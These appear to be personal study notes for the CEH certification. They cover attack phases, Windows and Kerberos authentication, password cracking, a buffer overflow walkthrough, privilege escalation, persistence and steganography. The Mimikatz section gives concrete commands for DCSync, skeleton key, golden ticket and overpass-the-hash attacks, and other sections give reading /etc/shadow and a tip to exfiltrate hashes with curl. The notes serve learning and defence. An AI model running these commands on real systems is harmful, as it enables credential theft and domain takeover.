## CEH Hacking Methodology

The CEH (Certified Ethical Hacker) methodology, as outlined by the EC-Council, is a structured approach to ethical hacking with specific phases targeting common goals and techniques. Here's a summary of each phase:


### 1. **Reconnaissance**
   - **Objective:** Gather information on the target before any direct engagement.
   - **Techniques:** Passive and active information gathering, including open-source intelligence (OSINT), scanning, and footprinting.
   

### 2. **Scanning**
   - **Objective:** Identify live hosts, open ports, services, and potential vulnerabilities.
   - **Techniques:** Network scanning, vulnerability scanning, and enumeration.
   

### 3. **System Hacking**
   - **Objective:** Gain unauthorized access to systems and escalate privileges.
   - **Key Actions:**
     - **Password Cracking:** Using tools to guess or decrypt passwords.
     - **Vulnerability Exploitation:** Leveraging identified vulnerabilities to gain access.
     - **Social Engineering:** Trick users into revealing sensitive information or taking unsafe actions.


### 4. **Privilege Escalation**
   - **Objective:** Gain higher-level access once initial access is achieved.
   - **Types:**
     - **Horizontal Escalation:** Accessing accounts with different permissions but at the same level.
     - **Vertical Escalation:** Moving to higher privilege levels, such as administrative access.


### 5. **Maintaining Access (Persistence)**
   - **Objective:** Ensure continued access to the compromised system.
   - **Techniques:** 
     - Installing malware for command and control (C2) communication.
     - Creating backdoor accounts.
     - Using persistence mechanisms to reconnect if access is interrupted.


### 6. **Hiding Files and Data Exfiltration**
   - **Objective:** Extract data covertly and avoid detection.
   - **Methods:** 
     - **Steganography:** Hiding sensitive data within image or video files.
     - **Covert Channels:** Using encrypted communication protocols like HTTPS for data transfer.
   

### 7. **Covering Tracks**
   - **Objective:** Conceal evidence of hacking activities.
   - **Techniques:** 
     - Clearing logs and deleting entries to remove traces of unauthorized access.
     - Ensuring minimal detection by system monitors or administrators.



## Windows Authentication

### Windows SAM (Security Accounts Manager):
- SAM is a database stored locally on a Windows system and contains user account information, including usernames and hashed passwords.
- When a user attempts to log in, Windows checks the provided username and password against the entries in the SAM database.
- If the credentials match, the user is authenticated, and access is granted.
- The file is locked up once the system boots up. Windows loads content to the memory.
- **Location**:
  - File: `C:\Windows\System32\config\SAM`
  - Registry: `HKEY_LOCAL_MACHINE\SAM`

### NTLM (NT LAN Manager):
NTLM is an authentication protocol used in Windows environments, though it is gradually being phased out in favor of the more secure Kerberos protocol.

- **Less Secure**: NTLM is considered less secure than Kerberos due to vulnerabilities in its hash-based challenge-response mechanism.
- **Usage**: Primarily used in older or non-domain Windows environments, or as a fallback when Kerberos is not available.

### NTLM Authentication Process
1. **Client Request**: The user initiates login by providing a username and password.
2. **Challenge-Response**:
   - The client sends a login request to the server with the username.
   - The server responds with a randomly generated challenge.
3. **Hash Calculation**: 
   - The client computes a cryptographic hash of the user's password, combines it with the challenge, and hashes this result (known as the NT hash).
4. **Hash Exchange**: The client sends the hashed response back to the server.
5. **Server Verification**:
   - The server compares the received hash with its stored hash for the user in the Security Accounts Manager (SAM) or Active Directory.
6. **Authentication**:
   - If the hashes match, the user is authenticated, and access is granted.
   - If the hashes do not match, authentication fails.

# Kerberos Authentication Protocol

**Kerberos** is a secure network authentication protocol commonly used in enterprise networks to authenticate client-server applications.

## Key Components
- **Key Distribution Center (KDC)**: The central authority that issues and manages tickets, comprised of:
  - **Authentication Server (AS)**: Handles initial authentication requests.
  - **Ticket Granting Server (TGS)**: Issues service tickets for access to specific resources.
- **Ticket Granting Ticket (TGT)**: A temporary credential allowing the user to request service tickets without needing to re-authenticate.
- **Service Ticket**: A ticket used to authenticate the user to a specific network service.

## Kerberos Authentication Steps
1. **Client Authentication Request**: The user initiates a request to access a network service.
2. **TGT Request (AS-REQ)**: The client sends an authentication request to the AS, asking for a TGT.
3. **TGT Issuance (AS-REP)**: The AS verifies the user’s credentials and issues a TGT, encrypted with a session key and a KDC secret key.
4. **Service Ticket Request (TGS-REQ)**: Using the TGT, the client requests a service ticket for the target service from the TGS.
5. **Service Ticket Issuance (TGS-REP)**: The TGS verifies the TGT and issues a service ticket for the target service, encrypted with the service’s secret key.
6. **Service Authentication**: The client presents the service ticket to the target service.
7. **Service Verification**: The service decrypts the service ticket, verifies its authenticity, and grants access if valid.

## Benefits of Kerberos
- **Mutual Authentication**: Both client and server validate each other’s identity.
- **Single Sign-On (SSO)**: Users authenticate once and gain access to multiple network services without re-authenticating.
- **Ticket-Based Authentication**: Reduces the need to transmit passwords over the network by using encrypted tickets.

Kerberos is widely implemented in systems like Windows Active Directory and Unix-based environments to enable secure, scalable authentication.

# Password Attacks

Password cracking methods are used to recover plaintext passwords from stored, hashed, or encrypted values. This overview includes common techniques, online vs. offline approaches, and popular tools.

## Non-Technical Techniques

- **Shoulder Surfing**: Observing someone’s screen or keyboard to capture a password.
- **Social Engineering**: Manipulating individuals to reveal sensitive information.
- **Dumpster Diving**: Recovering disposed items with potential password clues (e.g., sticky notes, discarded documents).

## Online Techniques

Online techniques are active attacks on live services requiring network connectivity.

### 1. Active Online Techniques

- **Dictionary Attack**: Uses a list of common passwords or words.
- **Brute Force Attack**: Systematically tries all possible character combinations.
- **Rule-Based Attack**: Applies custom rules to guess passwords.
- **Guessing Default Passwords**: Tries default passwords often associated with specific software or services.
- **Malware & Spyware**: Retrieves passwords directly from a compromised system.

### 2. Specialized Active Online Techniques

- **Pass the Hash**: Uses intercepted NTLM hash values without decrypting.
- **LLMNR Poisoning**: Exploits link-local multicast name resolution (LLMNR) vulnerabilities to capture hashes.
- **Internal Monologue**: Extracts NTLM hashes without network communication, effective when already on a target system.

### 3. Passive Online Techniques

- **Packet Sniffing**: Captures and analyzes packets for passwords.
- **Man-in-the-Middle (MITM)**: Intercepts communication to retrieve credentials.
- **Replay Attack**: Re-sends captured valid data packets.

## Offline Techniques

Offline attacks involve working on captured password hashes without connecting to the original service.

- **Dictionary & Brute Force**: Similar to online but performed on captured password files.
- **Rainbow Tables**: Uses precomputed hash tables to expedite cracking by directly comparing hash values.

## Tools

- **Online Active**: Hydra, Medusa (for brute force attacks over the network)
- **Online Passive**: Wireshark, Ettercap (for packet sniffing and MITM attacks)
- **Offline**:
  - **Hashcat**: High-performance tool for cracking large sets of hashes.
  - **John the Ripper**: Classic password-cracking tool.
  - **Ophcrack**: Utilizes rainbow tables.
  - **L0phtCrack**: Windows password auditing with LANMAN and NTLM hashes.

## Summary

Password cracking uses a variety of techniques, both technical and non-technical. Understanding the context (online vs. offline) and method (active vs. passive) helps in selecting the appropriate tool and approach.

# Password Extraction and Cracking

### 1. **Password Hashes and Obfuscation**
   - **Linux**: Passwords are stored in the `etc/shadow` file (requires sudo permissions).
   - **Windows**: Stored in locations such as **SAM**, **Kerberos**, and **NTLM** systems.

### 2. **Tools for Hash Extraction**
   - **Windows**:
      - **PWDump**: Extracts password hashes.
      - **MimiKatz**: Comprehensive tool, requires deep familiarity.
      - **Responder**: Intercepts authentication requests on a network for password hashes.
   - **Linux**: Direct access to `shadow` file for hash extraction, using tools like `cat` (with proper permissions).

### 3. **Hash Cracking Tools**
   - **John the Ripper**: Popular for dictionary-based attacks.
   - **Hashcat**: Known for speed and flexibility; supports various hash types and attack modes.
   - **Ophcrack**: Utilizes **rainbow tables** for NTLM hashes.
   - **Loft Crack**: Recently free; useful for different password cracking scenarios.

### 4. **Attacks Without Cracking**
   - **Pass-the-Hash**: Authentication bypass using hashed passwords directly for systems that accept them as passwords.


## Steps and Techniques

1. **Linux**:
   - Access the `shadow` file using `sudo cat /etc/shadow`.
   - Use a hash-cracking tool (e.g., John the Ripper) with a suitable wordlist.

2. **Windows**:
   - Run **PWDump** for hash extraction.
   - Store extracted hashes securely for offline cracking on a dedicated machine.
   - Use **Hashcat** with specific hash and attack modes for efficient cracking.

3. **Network Interception**:
   - **Responder** can capture NTLMv2 hashes on the network by acting as a man-in-the-middle.
   - Useful when the direct machine compromise isn’t feasible.

4. **Exfiltration Tactics**:
   - Use tools like `curl` to send captured hashes to an external server, e.g., with Python’s HTTP server.


## Countermeasures

1. **Strong Passwords**:
   - Ensure **length** and **complexity** (avoid dictionary words).
   - Use **salting** for additional security against hash-based attacks.

2. **Other Security Tips**:
   - Avoid weak passwords that could be quickly cracked or guessed.
   - Regularly monitor for unauthorized hardware (e.g., keyloggers).
  

# Enhancing Password Cracking Techniques


## Key Techniques

### 1. **Combinator Attack**
   - Combines two or more dictionaries to create a **more extensive wordlist**.
   - Useful for expanding the scope of password guesses.
   - Recommended to use scripts to **remove duplicates** to avoid redundant checks.

### 2. **Prince Attack**
   - Stands for **Probability Infinite Chained Elements**.
   - Uses a single dictionary but generates new word combinations based on **known criteria** (e.g., password length).
   - Ideal when some password characteristics (like minimum or maximum length) are known.

### 3. **Toggle Case**
   - Generates **case variations** for each word in the dictionary (e.g., "Password," "pAssword").
   - Ensures all possible uppercase/lowercase combinations are tried.
   - Helpful when case sensitivity is uncertain.

### 4. **Markov Chain**
   - A **statistical analysis-based approach** that uses common patterns observed in previously cracked passwords.
   - Builds likely passwords based on frequent character sequences, improving the dictionary's relevance.
   - Operates as a hybrid of dictionary and brute-force techniques.


## Tips for Efficient Cracking
- **Hardware Optimization**: Use multi-GPU setups, water-cooled systems, and multi-threading to increase speed.
- **Avoid Redundancy**: Use scripting to combine dictionaries without duplicates.
- **Utilize Known Criteria**: Apply filters based on password policies (e.g., length limits) to narrow guesses.


## Conclusion
- Combining techniques such as **combinator**, **Prince**, **toggle case**, and **Markov chain** enhances efficiency in password cracking.
  


# Buffer Overflow
If we have a program which has a buffer overflow issue, it means it doesn't handle the extra data correctly which then can cause it to crash OR we can use the vulnerability as: if we know the data sent overflows in a register for example ESB and I know when it flows (how many bytes) then I can control what is sent which can be a reverse shell code (by msfvenom tool for example).

### 1. **Buffer Overflow Basics**
   - **Definition**: Occurs when data overflows its allocated memory space into adjacent areas.
   - **Goal**: Achieve code execution by controlling where data overflows.

### 2. **Heap vs. Stack Overflows**
   - **Heap Overflow**: Involves dynamically allocated memory (e.g., using `malloc` in C).
   - **Stack Overflow**: Involves static memory allocation, where stack pointers (e.g., **EIP**, **ESP**) can be controlled to direct execution.

### 3. **Registers and Pointers**
   - Key registers:
     - **EIP** (Instruction Pointer): Points to the next instruction.
     - **ESP** (Stack Pointer) and **EBP** (Base Pointer): Track data in the stack.
   - Exploit requires control over these pointers to redirect execution.


## Tools and Setup

**Tools Required**
   - **Debugger** (e.g., Immunity Debugger): Used to analyze memory and monitor pointers.
   - **Python**: For scripting payloads and automated attacks.
   - **Mona.py**: Immunity Debugger plugin to assist in buffer overflow analysis.


## Steps for Exploiting a Buffer Overflow

1. **Fuzzing**: Sending incremental data to identify crash points.
   - Wrote a `fuzz.py` script in Python to send progressively larger payloads, detecting the crash point.
   - Discovered that the server crashes with payloads of 2400 bytes.

2. **Finding the EIP Offset**:
   - Generated a unique pattern (via `pattern_create`) to locate where the EIP register is overwritten.
   - Analyzed in Immunity Debugger to determine the exact byte offset for EIP overwrite.

3. **Controlling Execution Flow**
   - Located the **Jump ESP** command within the loaded modules (using Mona modules) to find the correct memory address for redirection.
   - Used Metasploit’s `msfvenom` to generate shellcode, ensuring to match the payload size with the required buffer length.

4. **Executing the Exploit**
   - Created a payload consisting of:
     - **NOP Sled**: Provides padding before shellcode.
     - **Shellcode**: Reverse shell payload created with `msfvenom`.
     - **EIP Redirect**: Points to **Jump ESP** to run shellcode in ESP.
   - Confirmed code execution by opening a reverse shell.


## Defense Mechanisms

1. **Memory Protections**
   - **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses, preventing predictable address targeting.
   - **DEP (Data Execution Prevention)**: Blocks code execution in specific memory regions.

2. **Secure Coding Practices**
   - Implement **input validation** and **boundary checks** to handle unexpected data sizes gracefully.
   - Use **static and dynamic code analysis** in the development lifecycle to catch buffer overflows early.



# Privilege Escalation
Privilege escalation refers to the process of gaining higher levels of access or privileges on a system or network than what was initially granted to a user or process. It's a common goal for attackers who have gained initial access to a system with limited privileges. There are two types:

1. Horizontal Privilege Escalation:
  - In horizontal privilege escalation, the attacker gains access to another account or process with the same level of privileges as their current account.
  - This typically involves impersonating another user or process that has similar access rights.
2. Vertical Privilege Escalation:
  - In vertical privilege escalation, the attacker gains access to higher levels of privileges than their current account or process.
  - This can involve escalating privileges from a low-privileged user account to an administrator or root-level account.


## Techniques for Privilege Escalation

### 1. **OS or Software Vulnerabilities**
   - Unpatched systems may have known exploits available on **ExploitDB**.
   - Tools like **searchsploit** (Kali Linux) can find local exploit databases.

### 2. **Misconfigurations**
   - Misconfigured permissions or shared folders can open doors for escalation.
   - Common errors include granting excessive permissions and failing to secure shares.

### 3. **DLL Hijacking**
   - **DLL Hijacking**: Placing a malicious DLL in a folder where the system expects a legitimate DLL.
   - Tools like **ProcMon** help identify missing DLLs that can be hijacked.

### 4. **Unattended Installation Files**
   - **unattend.xml** or **unattended.xml** files often contain sensitive information.
   - These files may store admin credentials, located in folders like `C:\Windows\System32\sysprep`.

### 5. **Unquoted Service Paths**
   - If a service path has spaces and lacks quotes, attackers can place a malicious executable in the expected path.
   - Example: A service path like `C:\Program Files\App Name` may execute `App.exe` if found in `C:\Program`.

### 6. **Scheduled Tasks**
   - Manipulating scheduled tasks (e.g., PowerShell scripts in Windows or cron jobs in Linux) can allow execution of malicious code.

### 7. **SUID/GUID Permissions**
   - In Linux, files with **SUID/GUID** set can run with elevated privileges.
   - Tools like **GTFOBins** list exploitable binaries with SUID bits.

### 8. **Sudo Privileges**
   - Misconfigured **sudo** permissions may allow escalation.
   - `sudo -l` command shows accessible binaries that could be exploited to gain root access.


## Tools for Privilege Escalation

1. **LinPEAS/WinPEAS (PEAS Suite)**
   - Automates privilege escalation checks and suggests exploitation paths on Linux (LinPEAS) and Windows (WinPEAS).

2. **Windows Exploit Suggester**
   - Analyzes Windows configurations to identify potential privilege escalation points.

3. **Linux Privilege Checker**
   - Runs privilege checks on Linux systems, identifying areas to escalate privileges.


## Defense Against Privilege Escalation

- **System Patching**: Apply patches for known vulnerabilities.
- **Principle of Least Privilege**: Grant only necessary permissions to users.
- **System Hardening**: Follow hardening guides and secure configurations.
- **Multifactor Authentication**: Adds an extra layer of protection against unauthorized access.
- **Secure Application Development**: Use **SAST** and **DAST** to test application security.


# Maintaining Access (Persistence)
1. Backdoors: Attackers may install backdoor programs or modify existing system components to create secret entry points into the compromised system. These backdoors can provide remote access to the system, allowing attackers to return and regain control even if their initial access is discovered and removed.

2. Rootkits: Rootkits are malicious software designed to hide the presence of other malicious programs or activities on a system. They operate at a deep level within the operating system, making them difficult to detect and remove. Rootkits can be used to maintain access by ensuring that the attacker's tools and processes remain hidden from system administrators and security software.

3. Scheduled Tasks and Cron Jobs: Attackers may create scheduled tasks or cron jobs to execute their malicious code at predefined intervals. By scheduling tasks to run periodically, attackers can maintain access to the compromised system without needing to maintain a constant presence.

4. Persistence Mechanisms: Attackers can leverage various persistence mechanisms built into operating systems to ensure their malicious code runs automatically every time the system boots or a user logs in. Examples include modifying startup scripts, registry keys, or system services.

### Rootkits in more details
Rootkits are malicious software designed to conceal the presence of other malicious programs or activities on a compromised system. There are several types:

- Kernel-Level Rootkits: Operate at the OS kernel level, replacing or modifying core OS functions.
- User-Level Rootkits: Exploit vulnerabilities in user-space applications to gain elevated privileges.
- Bootkits: Infect the boot process (e.g., MBR), controlling the system from startup.
- Hardware/Firmware Rootkits: Infect system hardware or firmware, controlling the system at a fundamental level.
- Memory Rootkits: Reside entirely in system memory, injecting malicious code into processes.

# Steganography
Steganography is the practice of concealing messages or information within other non-secret data or media in a way that the existence of the hidden information is not readily apparent. 

There are tools which can be used for that like:
- stegsnow: `stegsnow -p password cover_text.txt hidden_message.txt > output.txt`
- steghide: `steghide embed -ef hidden_file.txt -cf cover_image.jpg -p password`

And there are tools which are used to analyze and extract hidden messages like zsteg.

# Covering tracks

# Mimikatz
It is a Windows password post exploitation tool used to dump credentials and other sensitive information.

### what is DP API?
DPAPI stands for Data Protection API, which is a feature provided by Windows systems for encrypting and decrypting data. DPAPI is primarily used to protect sensitive data stored on Windows systems, such as user credentials, private keys, and other secrets.

- `sekurlsa::dpapi` to grap master keys from dpapi.
- `lsadump::backupkeys /system:win2019.example.com /export`
- `lsadump::dcsync /domain:example.com /user:Administrator`

### Skeleton Key Attack
In a skeleton key attack, an attacker gains unauthorized access to a Windows Active Directory (AD) domain controller and injects a "skeleton key" into the domain controller's memory. This "skeleton key" allows the attacker to authenticate as any user on the domain without needing their password (we use "mimikatz" as the passsword).

#### How?
- Firstly we have to enable the SeDebugPrivilege privilege for the current process: `privilege::debug`
- then: `misc::skeleton` and that's it!

### Golden Ticket Attack
A golden ticket allows to authenticate to any service with one single ticket. 

1. First we need to find the krbtgt service hash: `lsadump::dcsync /domain:example.com /user:krbtgt`.
2. Then we need to find the SID of a user account that will be granted the ticket: `whoami /user` on user's machine (Either an account I created or one I compromised).
3. Then: `kerberos::golden /domain:example.com /sid:{sid} /rc4:{krbtgt NTLM hash} /id:500 /user:{anything}` will grant the user this ticket where we use 500 as we are looking for administrative privileges.

### Overpass the Hash Attack
1. Firstly we need to find the user NTLM hash: `sekurlsa::logonpasswords`.
2. Then we need to execute this command: `sekurlsa::pth /user:Admisitrator /domain:example.com /ntlm:{user's NTLm}`.
3. Mimikatz opens a prompt then with user's privileges.

# Pivoting/Relaying
### Pivoting:
Pivoting involves using a compromised system, often referred to as a "pivot point" or "pivot host," to gain access to other systems or networks that are not directly accessible from the attacker's initial entry point. The pivot host serves as a bridge or intermediary for the attacker to launch further attacks against additional targets within the network.

Common techniques used in pivoting include:

- **Port Forwarding**: Setting up port forwarding or port redirection on the pivot host to relay traffic between the attacker and other systems within the network.
- **Proxying**: Configuring the pivot host to act as a proxy server, allowing the attacker to route traffic through it to reach other systems or services within the network.
- **Tunneling**: Establishing encrypted tunnels, such as SSH tunnels or VPN connections, from the pivot host to other systems or networks, providing a secure communication channel for the attacker.

### Relaying:
Relaying, also known as "relay attacks" or "credential relaying," involves intercepting authentication requests between two systems and relaying them to gain unauthorized access to resources or escalate privileges.

Common types of relay attacks include:

- **NTLM Relay**: Intercepting NTLM (NT LAN Manager) authentication requests between a client and a server and relaying them to gain access to resources on behalf of the client. This is commonly used in attacks such as SMB relay attacks.
- **Kerberos Relay**: Intercepting Kerberos authentication tickets and relaying them to gain access to systems or services that trust the compromised authentication.
- **HTTP/HTTPS Relay**: Intercepting HTTP or HTTPS traffic and relaying it to exploit vulnerabilities or gain access to sensitive information.

Relaying attacks exploit weaknesses in authentication protocols and trust relationships between systems to gain unauthorized access or escalate privileges within a network.

### what is proxychains?
ProxyChains is a tool used to force any TCP connection to follow through proxy servers or chains of proxies. It's typically used for anonymizing the origin of network traffic and bypassing network restrictions.

How it works: ProxyChains intercepts network connections initiated by applications and redirects them through a series of proxy servers defined in its configuration file. Each proxy server in the chain relays the connection to the next until it reaches the final destination.

Configuration: ProxyChains is configured through its configuration file (/etc/proxychains.conf on Linux). Users specify proxy servers, their ports, and optionally, the proxy type (e.g., SOCKS4, SOCKS5, HTTP). Additionally, users can specify rules for handling DNS requests.

Usage: Once configured, users simply prepend proxychains to their command-line applications to force them to use the configured proxy servers. For example: `proxychains curl example.com`.
